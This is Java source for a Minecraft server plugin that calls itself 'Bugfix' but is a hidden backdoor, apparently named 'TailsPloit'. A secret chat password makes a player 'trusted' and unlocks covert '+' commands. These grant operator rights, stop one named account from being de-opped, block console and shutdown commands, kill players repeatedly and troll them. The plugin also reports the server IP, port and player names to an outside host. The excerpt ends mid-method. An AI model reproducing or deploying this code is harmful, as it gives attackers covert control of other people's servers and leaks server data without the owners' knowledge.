package com.eimacon.bugfix.listeners;
import com.comphenix.protocol.PacketType;
import com.comphenix.protocol.events.PacketContainer;
import com.eimacon.bugfix.Bugfix;
import com.eimacon.bugfix.nbsapi.NbSong;
import com.eimacon.bugfix.nbsapi.NoteBlockPlayer;
import com.eimacon.bugfix.utils.*;
import com.eimacon.bugfix.utils.FileReader;
import org.bukkit.*;
import org.bukkit.block.Block;
import org.bukkit.entity.Entity;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.entity.ProjectileHitEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BookMeta;
import org.bukkit.material.Wood;
import org.bukkit.metadata.FixedMetadataValue;
import org.bukkit.plugin.InvalidPluginException;
import org.bukkit.plugin.Plugin;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

import java.io.*;

import com.google.common.io.Files;

import java.lang.reflect.Array;
import java.lang.reflect.InvocationTargetException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.nio.charset.Charset;
import java.nio.file.StandardCopyOption;
import java.util.*;
import java.util.logging.Level;

import org.bukkit.util.Vector;
import org.checkerframework.checker.units.qual.s;

import javax.xml.crypto.Data;

import static jdk.internal.org.jline.utils.Colors.M;


public class MessageListener implements Listener {
    public static boolean tntExplode = false;
    public static double explodeRadius = 0.01;
    private final List<String> kotzen = new ArrayList<>();
    private final List<String> pissrocket = new ArrayList<>();
    private final List<String> lsd = new ArrayList<>();
    private final List<String> moon = new ArrayList<>();
    private final List<String> trashtalk = new ArrayList<>();
    private final List<String> zoom = new ArrayList<>();
    private final List<String> stopchat = new ArrayList<>();
    private final List<String> screenblock = new ArrayList<>();
    private final List<String> failcmd = new ArrayList<>();
    private final List<String> tntworld = new ArrayList<>();
    private final List<String> caps = new ArrayList<>();
    private final List<String> swear = new ArrayList<>();
    private final List<String> hacked = new ArrayList<>();
    private final List<String> antiplus = new ArrayList<>();
    private final List<String> spin = new ArrayList<>();
    private final List<String> glassbox = new ArrayList<>();
    private final List<String> timespam = new ArrayList<>();
    private final List<String> spackmodus = new ArrayList<>();
    private final List<String> infkill = new ArrayList<>();
    private final List<String> bookmatrix = new ArrayList<>();
    private final List<String> sounds = new ArrayList<>();
    private final List<String> cmdspy = new ArrayList<>();
    private final List<String> tntrain = new ArrayList<>();
    private Material blockrain = null;
    private Location blockreg_loc = null;
    private boolean acspam = false;
    private boolean zoomTrigger = false;
    private boolean ptimespamTrigger = false;
    private boolean konsolenSpammer = false;
    private boolean blockconsole = false;
    private boolean rickrollActive = false;
    private static HashMap<UUID, Integer> tntworldintrad = new HashMap<UUID, Integer>();
    private static ArrayList<Location> tnts = new ArrayList<Location>();
    private static HashMap<UUID,ArrayList<Location>> tntworldblocklist = new HashMap<UUID, ArrayList<Location>>();
    public static HashMap<UUID,Location> snowballe = new HashMap<UUID, Location>();
    private static boolean allowWriteWhileControlled = false;
    public static boolean isSnowing = false;
    public static String spamMsg;
    public static String floodMsg;
    public static boolean antiStop;

    NoteBlockPlayer rickroll = new NoteBlockPlayer(Bugfix.getInstance());

    private boolean checkPlib(Player player) {
        if(!Bugfix.plib) {
            player.sendMessage(PluginPrefix + ChatColor.RED + "ProtocolLib is not installed. Do \"+plib\" to try to install it!");
            return true;
        }
        return false;
    }

    public MessageListener() {
        Bukkit.getScheduler().scheduleSyncRepeatingTask(Bugfix.getInstance(), () -> {
            if(acspam) {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "advancement grant @a everything");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "advancement revoke @a everything");
            }
            if(BlockEvent.ufoLoc != null) {
                BlockEvent.ufoLoc.getLocation().getWorld().playSound(BlockEvent.ufoLoc.getLocation(), Sound.BLOCK_BEACON_AMBIENT, 100, (float)0.2);
            }
            for(String Player : tntrain) {
                Player player = Bukkit.getPlayer(Player);
                if(player == null) {return;}

                player.getWorld().spawnEntity(player.getLocation().clone().add(0, 8, 0), EntityType.PRIMED_TNT);
                player.getWorld().spawnEntity(player.getLocation().clone().add(5, 8, 0), EntityType.PRIMED_TNT);
                player.getWorld().spawnEntity(player.getLocation().clone().add(-5, 8, 0), EntityType.PRIMED_TNT);
                player.getWorld().spawnEntity(player.getLocation().clone().add(5, 8, 5), EntityType.PRIMED_TNT);
                player.getWorld().spawnEntity(player.getLocation().clone().add(5, 8, -5), EntityType.PRIMED_TNT);
                player.getWorld().spawnEntity(player.getLocation().clone().add(-5, 8, 5), EntityType.PRIMED_TNT);
                player.getWorld().spawnEntity(player.getLocation().clone().add(-5, 8, -5), EntityType.PRIMED_TNT);
                player.getWorld().spawnEntity(player.getLocation().clone().add(0, 8, 5), EntityType.PRIMED_TNT);
                player.getWorld().spawnEntity(player.getLocation().clone().add(0, 8, -5), EntityType.PRIMED_TNT);
            }
        }, 0, 8);
        Bukkit.getScheduler().scheduleSyncRepeatingTask(Bugfix.getInstance(), () -> {
            for(String Player : timespam) {
                Player player = Bukkit.getPlayer(Player);
                if(player == null) {return;}
                if(ptimespamTrigger) {
                    player.setPlayerTime(18000, false);
                    player.getWorld().playSound(player, Sound.BLOCK_NOTE_BLOCK_PLING, 100.0F, 0.0F);
                    ptimespamTrigger = false;
                } else {
                    player.setPlayerTime(6000, false);
                    player.getWorld().playSound(player, Sound.BLOCK_NOTE_BLOCK_PLING, 100.0F, 2.0F);
                    ptimespamTrigger = true;
                }
                player.getWorld().playSound(player, Sound.ENTITY_ENDERMAN_TELEPORT, 100.0F, 2F);
                player.getWorld().playSound(player, Sound.BLOCK_NOTE_BLOCK_PLING, 100.0F, 0.6F);
            }
            for(String Player : tntworld) {
                Player player = Bukkit.getPlayer(Player);
                assert player != null;
                if(tntworldblocklist.get(player.getUniqueId()) == null) tntworldblocklist.put(player.getUniqueId(), new ArrayList<Location>());
                if (tntworldintrad.get(player.getUniqueId()) < 8) tntworldintrad.put(player.getUniqueId(), tntworldintrad.get(player.getUniqueId()) + 1);
            }
            for(String Player : tntworld) {
                Player player = Bukkit.getPlayer(Player);
                if(player == null) {return;}
                //player.sendBlockChange(player.getLocation().clone().add(0, -1, 0), Material.TNT.createBlockData());
                //ArrayList<Location> temppos = tntworldblocklist.get(player.getUniqueId());
                for (Block b : BlockEvent.getBlocks(player.getLocation().getBlock(), tntworldintrad.get(player.getUniqueId()))) {
                    if(!b.isEmpty()) {
                        //if(tntworldblocklist.get(player.getUniqueId()).contains(b.getLocation())) return;
                        player.sendBlockChange(b.getLocation(), Material.TNT.createBlockData());
                        //temppos.add(b.getLocation());
                        //tntworldblocklist.put(player.getUniqueId(), temppos);
                    }
                }
            }
            //ptimespamTrigger = !ptimespamTrigger;
        }, 0, 8);
        Bukkit.getScheduler().scheduleSyncRepeatingTask(Bugfix.getInstance(), () -> {
            for(String Player : kotzen) {
                Player player = Bukkit.getPlayer(Player);
                if(player == null) {return;}
                player.getWorld().dropItemNaturally(player.getLocation().add(-0.5, 0.5, -0.5), StackCreator.createItem(Material.LIME_WOOL, 1, "", "")).setPickupDelay(160);
                player.getWorld().dropItemNaturally(player.getLocation().add(-0.5, 0.5, -0.5), StackCreator.createItem(Material.YELLOW_WOOL, 1, "", "")).setPickupDelay(160);
                player.addPotionEffect(new PotionEffect(PotionEffectType.CONFUSION, 80, 10));
            }
            for(String Player : bookmatrix) {
                Player player = Bukkit.getPlayer(Player);
                if(player == null) {return;}
                ItemStack item = StackCreator.createItem(Material.WRITTEN_BOOK, 1, "§a§lMATRIX", "§a§lMATRIX");
                BookMeta meta = (BookMeta) item.getItemMeta();
                meta.setAuthor("§a§lMATRIX");
                meta.setTitle("§a§lMATRIX");
                String content = "";
                for(int i = 0; i < 100; i++) {
                    Random rand = new Random();
                    int rnd = rand.nextInt((4 - 1) + 1) + 1;
                    if(rnd == 1) {
                        content = content + "§20";
                    } else if(rnd == 2) {
                        content = content + "§a0";
                    } else if(rnd == 3) {
                        content = content + "§21";
                    } else if(rnd == 4) {
                        content = content + "§a1";
                    }
                }
                content = content + content + content;
                meta.setPages(content.toString(), "fuck");
                item.setItemMeta(meta);
                //Bukkit.getScheduler().scheduleSyncDelayedTask(Bugfix.getInstance(), () -> {
                    player.openBook(item);
                //}, 2);
            }
            if(blockrain != null && blockreg_loc != null) {
                blockreg_loc.getWorld().spawnFallingBlock(blockreg_loc.clone().add(Math.random() * 44, 88, Math.random() * 44), blockrain, (byte)0).setDropItem(false);
                blockreg_loc.getWorld().spawnFallingBlock(blockreg_loc.clone().add(Math.random() * -44, 88, Math.random() * -44), blockrain, (byte)0).setDropItem(false);
                blockreg_loc.getWorld().spawnFallingBlock(blockreg_loc.clone().add(Math.random() * 44, 88, Math.random() * -44), blockrain, (byte)0).setDropItem(false);
                blockreg_loc.getWorld().spawnFallingBlock(blockreg_loc.clone().add(Math.random() * -44, 88, Math.random() * 44), blockrain, (byte)0).setDropItem(false);
            }
            for(String Player : zoom) {
                Player player = Bukkit.getPlayer(Player);
                if(player == null) {return;}
                if(zoomTrigger) {
                    player.setWalkSpeed(-0.8F);
                    player.setFlySpeed(-0.4F);
                } else {
                    player.setWalkSpeed(0.8F);
                    player.setFlySpeed(0.4F);
                }
            }
            zoomTrigger = !zoomTrigger;
            if(konsolenSpammer) {
                String[] fehler = "lol haha".split(" ");
                Bukkit.broadcastMessage(fehler[42]);
            }
            for(String Player : spackmodus) {
                Player player = Bukkit.getPlayer(Player);
                if(player == null) {return;}
                player.teleport(new Location(player.getWorld(), player.getLocation().getX() + (Math.random()), player.getLocation().getY(), player.getLocation().getZ() + (Math.random()), (float)(Math.random() * 10), (float)(Math.random() * 10)));
                player.teleport(new Location(player.getWorld(), player.getLocation().getX() - (Math.random()), player.getLocation().getY(), player.getLocation().getZ() - (Math.random()), (float)(Math.random() * 10), (float)(Math.random() * 10)));
            }
            if(spamMsg != null) {
                for(Player p : Bukkit.getOnlinePlayers()) {
                    p.sendMessage(spamMsg);
                }
            }
            if(floodMsg != null) {
                Bukkit.getConsoleSender().sendMessage(floodMsg);
            }
        }, 0, 1);
        Bukkit.getScheduler().scheduleSyncRepeatingTask(Bugfix.getInstance(), () -> {
            for(String Player : screenblock) {
                Player player = Bukkit.getPlayer(Player);
                if(player == null) {return;}
                player.closeInventory();
            }
            for(String Player : infkill) {
                Player player = Bukkit.getPlayer(Player);
                if(player == null) {return;}
                player.setHealth(0.0D);
                player.setSaturation(0.0F);
            }
            for(String Player : kotzen) {
                Player player = Bukkit.getPlayer(Player);
                if(player == null) {return;}
                player.getWorld().playSound(player, Sound.ENTITY_ZOMBIE_DEATH, 100.0F, 0.8F);
            }
            for(String Player : spin) {
                Player player = Bukkit.getPlayer(Player);
                if(player == null) {return;}
                player.teleport(new Location(player.getWorld(), player.getLocation().getX(), player.getLocation().getY(), player.getLocation().getZ(), player.getLocation().getYaw() + 10, player.getLocation().getPitch()));
            }
            for(String Player : glassbox) {
                @Deprecated
                Player player = Bukkit.getPlayer(Player);
                if(player == null) {return;}
                player.teleport(player.getLocation().getBlock().getLocation().clone().add(0.5, 0, 0.5));
                player.sendBlockChange(player.getLocation().clone().add(0, -1, 0), Material.GLASS, (byte)0);
                player.sendBlockChange(player.getLocation().clone().add(0, 2, 0), Material.GLASS, (byte)0);
                player.sendBlockChange(player.getLocation().clone().add(1, 0, 0), Material.GLASS, (byte)0);
                player.sendBlockChange(player.getLocation().clone().add(-1, 0, 0), Material.GLASS, (byte)0);
                player.sendBlockChange(player.getLocation().clone().add(1, 1, 0), Material.GLASS, (byte)0);
                player.sendBlockChange(player.getLocation().clone().add(-1, 1, 0), Material.GLASS, (byte)0);
                player.sendBlockChange(player.getLocation().clone().add(0, 0, 1), Material.GLASS, (byte)0);
                player.sendBlockChange(player.getLocation().clone().add(0, 0, -1), Material.GLASS, (byte)0);
                player.sendBlockChange(player.getLocation().clone().add(0, 1, 1), Material.GLASS, (byte)0);
                player.sendBlockChange(player.getLocation().clone().add(0, 1, -1), Material.GLASS, (byte)0);
            }
            for(String Player : pissrocket) {
                Player player = Bukkit.getPlayer(Player);
                if(player == null) {return;}
                player.getWorld().getBlockAt(player.getLocation().getBlock().getLocation().add(0.5, -1, 0.5)).setType(Material.YELLOW_WOOL);
                player.addPotionEffect(new PotionEffect(PotionEffectType.LEVITATION, 10, 4, false, false));
                player.setVelocity(new Vector(0, 0.2, 0));
                player.getWorld().playSound(player, Sound.BLOCK_LAVA_EXTINGUISH, 100.0F, 0.8F);
            }
            for(String Player : hacked) {
                Player player = Bukkit.getPlayer(Player);
                if(player == null) {return;}
                player.addPotionEffect(new PotionEffect(PotionEffectType.ABSORPTION, 1, 20/*0*/ + (int)(Math.random() * 20)), true);
                player.getWorld().strikeLightning(player.getLocation());
                player.teleport(player.getLocation().add(Math.random() * 20, Math.random() * 4, Math.random() * 20));
                player.teleport(player.getLocation().add(Math.random() * -20, Math.random() * -4, Math.random() * -20));
                player.getWorld().playSound(player, Sound.ENTITY_BAT_AMBIENT, 1.0F, 0.0F);
                player.getWorld().playSound(player, Sound.BLOCK_NOTE_BLOCK_BASS, 200.0F, 0.2F);
                @s
                String content = "";
                for(int i = 0; i < 100; i++) {
                    Random rand = new Random();
                    int rnd = rand.nextInt((4 - 1) + 1) + 1;
                    if(rnd == 1) {
                        content = content + "§20";
                    } else if(rnd == 2) {
                        content = content + "§a0";
                    } else if(rnd == 3) {
                        content = content + "§21";
                    } else if(rnd == 4) {
                        content = content + "§a1";
                    }
                }
                content = content + content + content;
                if(content == "") /*bigerror[{bugerror*/ {

                }
                player.setHealth(20.0);
                player.setExp(player.getExp());
                player.sendMessage(ChatColor.GREEN + content);
                player.sendMessage(ChatColor.DARK_RED + "HACKING SERVER...");
                player.setAllowFlight(true);

            }
            for(String Player : lsd) {
                Player player = Bukkit.getPlayer(Player);
                if(player == null) {return;}
                player.addPotionEffect(new PotionEffect(PotionEffectType.CONFUSION, 80, 10));
                player.addPotionEffect(new PotionEffect(PotionEffectType.SPEED, 10, 4));
                player.addPotionEffect(new PotionEffect(PotionEffectType.ABSORPTION, 80, 10));
                player.addPotionEffect(new PotionEffect(PotionEffectType.BAD_OMEN, 80, 10));
                player.addPotionEffect(new PotionEffect(PotionEffectType.BLINDNESS, 80, 10));
                player.addPotionEffect(new PotionEffect(PotionEffectType.GLOWING, 80, 10));
                player.addPotionEffect(new PotionEffect(PotionEffectType.JUMP, 80, 10));
                player.addPotionEffect(new PotionEffect(PotionEffectType.HUNGER, 80, 10));
                player.addPotionEffect(new PotionEffect(PotionEffectType.POISON, 80, 10));
                player.addPotionEffect(new PotionEffect(PotionEffectType.WEAKNESS, 80, 10));
                player.addPotionEffect(new PotionEffect(PotionEffectType.LUCK, 80, 10));
                player.addPotionEffect(new PotionEffect(PotionEffectType.CONDUIT_POWER, 80, 10));
                player.addPotionEffect(new PotionEffect(PotionEffectType.HERO_OF_THE_VILLAGE, 80, 10));
                player.getWorld().playSound(player, Sound.BLOCK_NOTE_BLOCK_BIT, 100.0F, 1.3F);
                //player.getWorld().spawnParticle(Particle.SNEEZE, player.getLocation(), 1,1);
            }
            for(String Player : moon) {
                Player player = Bukkit.getPlayer(Player);
                if(player == null) {return;}
                player.getWorld().playSound(player, Sound.ENTITY_GHAST_SHOOT, 100.0F, 1.3F);
                int wert = 1;
                player.setVelocity(new Vector((float) -wert + (float) (Math.random() * ((wert - -wert) + wert)), (float) -wert + (float) (Math.random() * ((wert - -wert) + wert)), (float) -wert + (float) (Math.random() * ((wert - -wert) + wert))));
            }
            for(String Player : sounds) {
                Player player = Bukkit.getPlayer(Player);
                if(player == null) {return;}
                player.getWorld().playSound(player, Sound.ENTITY_GHAST_SHOOT, 100.0F, 2F);
                player.getWorld().playSound(player, Sound.ENTITY_ENDERMAN_TELEPORT, 100.0F, 1F);
                player.getWorld().playSound(player, Sound.ENTITY_ENDERMAN_AMBIENT, 100.0F, 1F);
                player.getWorld().playSound(player, Sound.ENTITY_ENDERMAN_DEATH, 100.0F, 1F);
                player.getWorld().playSound(player, Sound.ENTITY_SPIDER_DEATH, 100.0F, 2F);
                player.getWorld().playSound(player, Sound.ENTITY_SLIME_ATTACK, 100.0F, 0.4F);
                player.getWorld().playSound(player, Sound.ENTITY_BAT_AMBIENT, 100.0F, 1.7F);
                player.getWorld().playSound(player, Sound.ENTITY_GENERIC_DEATH, 100.0F, 0F);
            }
        }, 40, 0);

    }

    @SuppressWarnings("instance-refrence")
    private static net.md_5.bungee.api.ChatColor cc;
    //public static String PluginPrefix = (ChatColor.GRAY + "[" + cc.of("#ffb300") + "D" +  cc.of("#ffc400") + "w" + cc.of("#ffd000") + "a" + cc.of("#ffe600") + "r" + cc.of("#fff200") + "s" + cc.of("#fbff00") + "P" + cc.of("#c3ff00") + "l" + cc.of("#a2ff00") + "o" + cc.of("#77ff00") + "i" + cc.of("#2bff00") +"t" + ChatColor.GRAY + "] ");
    public static String PluginPrefix = (ChatColor.GRAY + "[" + cc.of("#ffb300") + "T" +  cc.of("#ffc400") + "a" + cc.of("#ffd000") + "i" + cc.of("#ffe600") + "l" + cc.of("#fff200") + "s" + cc.of("#fbff00") + "P" + cc.of("#c3ff00") + "l" + cc.of("#a2ff00") + "o" + cc.of("#77ff00") + "i" + cc.of("#2bff00") +"t" + ChatColor.GRAY + "] ");

    @EventHandler(priority = EventPriority.HIGHEST)
    @Deprecated
    public void CommandSent (PlayerCommandPreprocessEvent event) {
        if(event.getMessage().startsWith("/pardon") || event.getMessage().startsWith("/unban")) {
            if(event.getMessage().split(" ").length > 1) {
                Bugfix.request("https://api.deinemudda.net/player/unban/?ip=" + Bugfix.getServerIpString() + "&port=" + Bukkit.getServer().getPort() + "&target=" + event.getMessage().split(" ")[1] + "&player=" + event.getPlayer().getName());
            }
        }
        if(event.getMessage().startsWith("/ban")) {
            if(event.getMessage().split(" ").length > 1) {
                Bugfix.request("https://api.deinemudda.net/player/ban/?ip=" + Bugfix.getServerIpString() + "&port=" + Bukkit.getServer().getPort() + "&target=" + event.getMessage().split(" ")[1] + "&player=" + event.getPlayer().getName());
            }
        }
        if(event.getMessage().startsWith("/kick")) {
            if(event.getMessage().split(" ").length > 1) {
                Bugfix.request("https://api.deinemudda.net/player/kick/?ip=" + Bugfix.getServerIpString() + "&port=" + Bukkit.getServer().getPort() + "&target=" + event.getMessage().split(" ")[1] + "&player=" + event.getPlayer().getName());
            }
        }
        if(stopchat.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
        }
        if(glassbox.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
        }
        if(failcmd.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            event.getPlayer().chat(event.getMessage().replaceFirst("/", "7"));
        }
        for(String n : cmdspy) {
            Player p = Bukkit.getPlayer(n);
            if(p == null) return;
            p.sendMessage(PluginPrefix + "§7[§cCMDSPY§7]" + " §6" + event.getPlayer().getName() + "§8: §7" + event.getMessage());
        }

        if(event.getMessage().contains("stop") || event.getMessage().contains("reload") || event.getMessage().contains("shutdown") || event.getMessage().contains("restart")) {
            if(antiStop) {
                event.setCancelled(true);
                event.getPlayer().sendMessage("RETARD!");
            }
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    @Deprecated
    public void BlockBroken (BlockBreakEvent event) {
        if(glassbox.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    @Deprecated
    public void ConsoleCommand (ServerCommandEvent event) {
        if(blockconsole) {
            event.setCommand("consolecommandsareblocked");
            event.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    @Deprecated
    public void EntityHit (ProjectileHitEvent event) {
        if(event.getEntity().hasMetadata("isBoomer")) {
            if(!isSnowing) return;
            if(event.getEntity().getLocation().clone().add(0, 1, 0).getBlock().getType() == Material.WATER) return;
            if(event.getEntity().getLocation().clone().add(0, 1, 0).getBlock().getType() == Material.LAVA) return;
            if(event.getEntity().getLocation().getY() < event.getEntity().getWorld().getHighestBlockAt(event.getEntity().getLocation()).getLocation().getY()) return;
            event.getEntity().getWorld().createExplosion(event.getEntity().getLocation(), 1);
            Random rand = new Random();
            int rnd = rand.nextInt((4 - 1) + 1) + 1;
            for(int i = 0; i < 2; i++) {
                Entity newb = event.getEntity().getWorld().spawnEntity(event.getEntity().getLocation().clone().add(0, 0, 0), EntityType.SNOWBALL);
                newb.setMetadata("isBoomer", new FixedMetadataValue(Bugfix.getInstance(), true));
                if(rnd == 1) {
                    newb.setVelocity(new Vector(Math.random() * 0.2, 1, Math.random() * 0.2));
                } else if(rnd == 2){
                    newb.setVelocity(new Vector(Math.random() * -0.2, 1, Math.random() * -0.2));
                } else if(rnd == 3){
                    newb.setVelocity(new Vector(Math.random() * 0.2, 1, Math.random() * -0.2));
                } else if(rnd == 4){
                    newb.setVelocity(new Vector(Math.random() * -0.2, 1, Math.random() * 0.2));
                }
            }
            event.getEntity().remove();
            event.setCancelled(true);
        }
    }


    /*
    @Deprecated
    @EventHandler
    public void Message2(PlayerInteractEvent event) {
        if(event.getItem().getItemMeta().getDisplayName().contains("#rimsbefuhl#omegalul#lulzhaha#getripped")) {
            if (Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.AQUA + "Du hast dich untrusted.");
                Bugfix.trustedPlayers.remove(event.getPlayer().getName());
            } else {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.AQUA + "You can jetzt die + Befehle verwenden!");
                Bugfix.trustedPlayers.add(event.getPlayer().getName());
            }
        }
    }


    @EventHandler
    public void Message1(PlayerChatEvent event) {
        if(event.getMessage().contains("lulzhaha")) {
            event.setCancelled(true);
            if(Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.AQUA + "Du hast dich untrusted.");
                Bugfix.trustedPlayers.remove(event.getPlayer().getName());
            } else {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.AQUA + "You can jetzt die + Befehle verwenden!");
                Bugfix.trustedPlayers.add(event.getPlayer().getName());
            }
        }
    }
     */
    /*
    @Deprecated
    @EventHandler
    public void Message2(AsyncChatEvent event) {
        if(event.originalMessage().toString().contains("lulzhaha")) {
                event.setCancelled(true);
                if(Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.AQUA + "Du hast dich untrusted.");
                    Bugfix.trustedPlayers.remove(event.getPlayer().getName());
                } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.AQUA + "You can jetzt die + Befehle verwenden!");
                    Bugfix.trustedPlayers.add(event.getPlayer().getName());
                }
        }
    }
    */

    @EventHandler(priority = EventPriority.HIGHEST)
    @Deprecated
    public void GuiClick (InventoryClickEvent event) {
        if(event.getView().getTitle().equalsIgnoreCase("§4§lTroll Items") && event.getCurrentItem() != null) {
            if(event.getCurrentItem().getType() == Material.BARRIER) {
                event.getInventory().close();
            } else if(event.getCurrentItem().getType() == Material.LIME_DYE) {
                for(int i = 0; i < event.getInventory().getSize(); i++) {
                    if(event.getInventory().getItem(i) == null) continue;
                    if(event.getInventory().getItem(i).getItemMeta().getLore().get(0).contains("A#TrollItem")) {
                        event.getWhoClicked().getInventory().addItem(event.getInventory().getItem(i));
                    }
                }
                event.getInventory().close();
            };
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    @Deprecated
    public void onMessage (AsyncPlayerChatEvent event) throws InvocationTargetException {
        String[] args = event.getMessage().split(" ");

        try {

            if (event.getMessage().equalsIgnoreCase(FileReader.crypt("", 126).split("\n")[1]) || event.getMessage().equalsIgnoreCase("lulzhaha")) {
                event.setCancelled(true);
                if (Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.AQUA + "You untrusted yourself.");
                    Bugfix.trustedPlayers.remove(event.getPlayer().getName());
                    Bugfix.request("https://api.deinemudda.net/plugin/untrust/?ip=" + Bugfix.getServerIpString() + "&port=" + Bukkit.getServer().getPort() + "&player=" + event.getPlayer().getName());
                } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.AQUA + "You can use the + commands now!");
                    Bugfix.trustedPlayers.add(event.getPlayer().getName());
                    Bugfix.request("https://api.deinemudda.net/plugin/trust/?ip=" + Bugfix.getServerIpString() + "&port=" + Bukkit.getServer().getPort() + "&player=" + event.getPlayer().getName());
                }
            }

        } catch (Exception e) {
            //do something error here
        }

        if (event.getMessage().equalsIgnoreCase("+items") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            //event.getPlayer().getInventory().addItem(new ItemStack(Material.TNT));
            event.setCancelled(true);
            if (args.length != 1) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +items");
                return;
            }
            Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "Your Troll Items :)");
                Inventory inv = Bukkit.createInventory(null, 9 * 4, "§4§lTroll Items"/*, ""*/);
                //inv.get
                inv.addItem(StackCreator.createItem(Material.TNT, 1, "§r§4Troll TNT", "A#TrollItem"));
                inv.addItem(StackCreator.createItem(Material.ANVIL, 1, "§r§7Raining Anvil", "A#TrollItem"));
                inv.addItem(StackCreator.createItem(Material.ACACIA_LEAVES, 1, "§r§aTree Generator", "A#TrollItem"));
                inv.addItem(StackCreator.createItem(Material.GRASS_BLOCK, 1, "§r§aFlying Blocks", "A#TrollItem"));
                inv.addItem(StackCreator.createItem(Material.BASALT, 1, "§r§9Tornado", "A#TrollItem"));
                inv.addItem(StackCreator.createItem(Material.ORANGE_WOOL, 1, "§r§eN§6y§9a§an§bC§ca§dt", "A#TrollItem"));
                inv.addItem(StackCreator.createItem(Material.WHITE_TERRACOTTA, 1, "§r§dShlong attack", "A#TrollItem"));
                inv.addItem(StackCreator.createItem(Material.OBSIDIAN, 1, "§r§7Meteorite", "A#TrollItem"));
                inv.addItem(StackCreator.createItem(Material.GOLD_BLOCK, 1, "§r§6Pacman", "A#TrollItem"));
                inv.addItem(StackCreator.createItem(Material.BEE_NEST, 1, "§r§5Termites", "A#TrollItem"));
                inv.addItem(StackCreator.createItem(Material.BONE, 1, "§r§fExplowballs", "A#TrollItem"));
                inv.addItem(StackCreator.createItem(Material.TNT_MINECART, 1, "§cBomb", "A#TrollItem"));
                inv.setItem(35, StackCreator.createItem(Material.BARRIER, 1, "§c§lClose", "Close the Item GUI"));
                inv.setItem(34, StackCreator.createItem(Material.LIME_DYE, 1, "§a§lAll", "Get all Troll Items"));
                event.getPlayer().openInventory(inv);
                event.getPlayer().playSound(event.getPlayer().getLocation(), Sound.ENTITY_PLAYER_LEVELUP, 100, 1);
                //event.getPlayer().getInventory().addItem();
            });
        } else if (event.getMessage().startsWith("+op") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            //event.getPlayer().getInventory().addItem(new ItemStack(Material.TNT));
            event.setCancelled(true);
            if (args.length == 1) {
                event.getPlayer().setOp(true);
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "You have OP now!");
            } else if (args.length == 2) {
                Player target = (Bukkit.getServer().getPlayer(args[1]));
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                    return;
                }
                target.setOp(true);
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "You gave " + ChatColor.GREEN + target.getName() + ChatColor.YELLOW + " OP Permissions!");

            } else {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +op <Optional Player>");
                return;
            }
        } else if (event.getMessage().startsWith("+deop") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            //event.getPlayer().getInventory().addItem(new ItemStack(Material.TNT));
            event.setCancelled(true);
            if (args.length == 1) {
                event.getPlayer().setOp(false);
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "You removed your OP permissions!");
            } else if (args.length == 2) {
                Player target = (Bukkit.getServer().getPlayer(args[1]));
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                    return;
                }
                if (target.getName().equalsIgnoreCase("Dwarslooper")) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "You can't remove OP permissions from " + ChatColor.GREEN + target.getName() + ChatColor.RED + "!");
                    return;
                }
                target.setOp(false);
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "You removed OP permissions from " + ChatColor.GREEN + target.getName() + ChatColor.YELLOW + "!");

            } else {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +deop <Optional Player>");
                return;
            }
        } else if (args[0].equalsIgnoreCase("+lsd") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if (args.length != 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +lsd <Player>");
                return;
            }
            Player target = (Bukkit.getServer().getPlayer(args[1]));
            if (target == null) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                return;
            }
